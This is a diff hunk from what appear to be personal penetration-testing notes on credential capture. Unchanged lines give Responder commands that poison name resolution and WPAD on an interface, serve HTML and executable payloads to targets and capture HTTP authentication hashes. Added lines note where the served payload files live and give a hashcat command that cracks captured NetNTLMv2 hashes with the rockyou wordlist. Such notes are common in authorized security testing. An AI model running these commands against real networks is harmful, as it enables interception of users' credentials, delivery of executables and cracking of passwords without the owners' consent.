@@ -64,7 +64,12 @@ responder -I tap0 --lm -e SpoofedIpOfDC
 #server exec and html to target, can edit payload and page text easily 
 responder -I tap0 --lm -r On -w On
 #wpad (old af) and basic http auth after initial inspect for ground fruit
+#html and exe are in /usr/share/responder/files/
 responder -I tap0 -wFb 
+#John sucks and is a PIA, use hashcat instead, rockyou takes <1min on a slow VM
+hashcat -m 5600 HTTP-HAS-FILE /usr/share/wordlists/rockyou.txt
+
+
 
 
 
